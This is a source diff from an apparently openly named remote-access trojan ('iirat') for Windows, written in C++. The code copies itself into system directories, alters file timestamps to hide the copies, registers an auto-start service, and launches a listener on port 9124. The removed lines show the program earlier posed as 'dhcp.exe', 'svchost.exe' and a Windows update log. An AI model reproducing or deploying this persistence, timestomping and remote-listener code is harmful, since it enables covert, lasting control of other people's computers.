@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-19 12:27:02
+* @Last Modified time: 2017-04-20 12:54:03
 */
 
 #include <vector>
@@ -74,7 +74,7 @@ static bool terminated = false;
 static bool logged_in = false;
 static bool command_ack = false;
 
-static char filename[] = "C:\\Windows\\Temp\\WindowsUpdates.log";
+static char filename[] = "C:\\Windows\\Temp\\.socket";
 
 static STARTUPINFO startupInfo;
 static PROCESS_INFORMATION processInfo;
@@ -591,22 +591,22 @@ int install(bool serviceInstall)
 
     DPRINT("%s: %s %s\n", __func__, sysPath, exePath);
 
-    sprintf(newPath, "%s\\dhcp.exe", sysPath);
+    sprintf(newPath, "%s\\iirat.exe", sysPath);
     CopyFile(exePath, newPath, false);
 
     // change access time
     sprintf(cmd, "touch -t 201612261154 \"%s\"", newPath);
     pclose(popen(cmd, "r"));
 
-    sprintf(newPath, "%s\\..\\svchost.exe", sysPath);
+    sprintf(newPath, "%s\\..\\iiratc.exe", sysPath);
     CopyFile(exePath, newPath, false);
     // change access time
     sprintf(cmd, "touch -t 201612261154 \"%s\"", newPath);
     pclose(popen(cmd, "r"));
 
-    sprintf(cmd, "sc create dhcp32 binPath= \"%s service\" start= auto", newPath);
+    sprintf(cmd, "sc create iirat32 binPath= \"%s service\" start= auto", newPath);
     pclose(popen(cmd, "r"));
-    pclose(popen("sc start dhcp32", "r"));
+    pclose(popen("sc start iirat32", "r"));
 
     DPRINT("%s: SUCCESS!\n", __func__);
     return 0;
@@ -623,7 +623,7 @@ void ServiceMain(int argc, char *argv[])
     ServiceStatus.dwCheckPoint = 0;
     ServiceStatus.dwWaitHint = 0;
 
-    hServiceStatus = RegisterServiceCtrlHandler("dhcp", (LPHANDLER_FUNCTION) ControlHandler);
+    hServiceStatus = RegisterServiceCtrlHandler("iirat", (LPHANDLER_FUNCTION) ControlHandler);
     if (hServiceStatus == (SERVICE_STATUS_HANDLE) 0) return;
 
     ServiceStatus.dwCurrentState = SERVICE_RUNNING;
@@ -633,7 +633,7 @@ void ServiceMain(int argc, char *argv[])
     char cmd[MAX_PATH];
 
     GetSystemDirectory(exePath, MAX_PATH);
-    sprintf(cmd, "%s\\..\\svchost.exe app 0.0.0.0 9124", exePath);
+    sprintf(cmd, "%s\\..\\iiratc.exe app 0.0.0.0 9124", exePath);
 
     int status;
     DWORD exitCode = 0;
@@ -677,7 +677,7 @@ int main(int argc, char *argv[])
             freopen("C:\\Windows\\Temp\\.SysWow64.log", "a", stdout);
         #endif
         SERVICE_TABLE_ENTRY serviceTable[2];
-        serviceTable[0].lpServiceName = "dhcp";
+        serviceTable[0].lpServiceName = "iirat";
         serviceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
 
         serviceTable[1].lpServiceName = NULL;
